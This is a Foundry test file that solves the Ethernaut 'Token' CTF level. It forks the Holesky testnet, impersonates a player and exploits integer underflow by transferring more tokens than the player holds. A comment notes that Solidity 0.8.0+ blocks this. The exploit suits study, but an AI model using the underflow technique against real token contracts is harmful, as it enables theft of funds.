// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
// 0.8.0以上的版本会自动检查溢出，这题就解不了了

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Token} from "../../src/Ethernaut/Token.sol";

contract TokenAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Token token = Token(0xCEe30e364314789FE18d0a6ef933f5460E493B3a);
        token.transfer(address(0), 21);
        vm.stopPrank();
        assertTrue(token.balanceOf(playerAddress) > 20);
    }
}
